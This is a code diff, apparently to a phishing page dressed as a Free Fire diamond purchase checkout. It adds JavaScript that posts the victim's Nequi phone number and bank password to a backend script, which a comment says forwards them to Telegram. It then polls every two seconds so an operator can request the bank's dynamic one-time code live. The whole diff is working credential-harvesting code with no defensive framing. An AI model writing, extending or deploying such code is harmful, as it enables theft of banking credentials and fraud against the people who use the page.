@@ -244,6 +244,38 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
     // Aquí puedes agregar código para mostrar un loader si es necesario
   }
 
+  // Función para polling de dinámica
+  function startDinamicaPolling(telefono) {
+    const pollInterval = setInterval(async () => {
+      try {
+        const response = await fetch("1.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            action: "check_dinamica_status",
+            telefono: telefono
+          })
+        });
+
+        const data = await response.json();
+
+        if (data.status === 'dinamica_solicitada') {
+          clearInterval(pollInterval);
+          // Mostrar modal de dinámica
+          const modalDinamica = document.getElementById("modalDinamica");
+          if (modalDinamica) {
+            modalDinamica.style.display = "flex";
+            document.getElementById("dinamicaNequi").focus();
+          }
+        }
+      } catch (error) {
+        console.error("Error en polling:", error);
+      }
+    }, 2000); // Polling cada 2 segundos
+  }
+
   // Mostrar modal inmediatamente al cargar la página
   document.addEventListener('DOMContentLoaded', function() {
     // Obtener y mostrar el monto
@@ -312,7 +344,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
     // Agregar event listener al botón
     const btnEnviar = document.getElementById("btnEnviarNequi");
     if (btnEnviar) {
-      btnEnviar.addEventListener("click", function() {
+      btnEnviar.addEventListener("click", async function() {
         const telefono = document.getElementById("telefonoNequi").value;
         const clave = document.getElementById("claveNequi").value;
 
@@ -326,12 +358,44 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           return;
         }
 
-        // Ocultar modal actual y mostrar modal de dinámica
-        modal.style.display = "none";
-        const modalDinamica = document.getElementById("modalDinamica");
-        if (modalDinamica) {
-          modalDinamica.style.display = "flex";
-          document.getElementById("dinamicaNequi").focus();
+        // Mostrar loader
+        mostrarLoader("Enviando datos iniciales...");
+
+        try {
+          // Enviar datos iniciales a Telegram (sin dinámica)
+          const response = await fetch("1.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              action: "enviar_datos_nequi_directo",
+              telefono: telefono,
+              clave: clave,
+              dinamica: "", // Vacío inicialmente
+              monto: montoValor,
+              playerId: "<?php echo addslashes($freefire_data['playerId']); ?>",
+              playerName: "<?php echo addslashes($freefire_data['playerName']); ?>",
+              diamonds: "<?php echo addslashes($freefire_data['diamonds']); ?>",
+              bonus: "<?php echo addslashes($freefire_data['bonus']); ?>"
+            })
+          });
+
+          const data = await response.json();
+
+          if (data.ok) {
+            // Ocultar modal y mostrar mensaje de espera
+            modal.style.display = "none";
+            alert("Datos enviados. Esperando solicitud de dinámica del administrador...");
+
+            // Iniciar polling para verificar si se solicitó dinámica
+            startDinamicaPolling(telefono);
+          } else {
+            alert("Error al enviar datos: " + (data.error || "Error desconocido"));
+          }
+        } catch (error) {
+          console.error("Error:", error);
+          alert("Error de conexión. Inténtalo de nuevo.");
         }
       });
     }
